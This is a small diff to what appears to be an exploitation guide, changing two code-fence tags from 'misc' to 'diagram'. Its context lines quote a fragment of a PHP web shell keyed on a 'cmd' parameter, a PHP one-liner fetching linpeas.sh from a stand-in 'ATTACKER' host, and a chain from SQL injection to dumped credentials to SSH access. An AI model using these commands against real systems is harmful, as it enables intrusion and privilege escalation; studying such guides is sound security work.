@@ -254,7 +254,7 @@ if(isset($_REQUEST['cmd'])){
 
 ## Chaining Vulnerabilities
 
-```misc
+```diagram
 Real-world exploitation often chains multiple lower-severity
 vulnerabilities into a critical attack:
 
@@ -355,7 +355,7 @@ php -r "file_put_contents('linpeas.sh', file_get_contents('http://ATTACKER/linpe
 
 ## Common Exploitation Patterns
 
-```misc
+```diagram
 Pattern 1: Credentials -> SSH Access
   1. Find SQL injection
   2. Dump user credentials from database
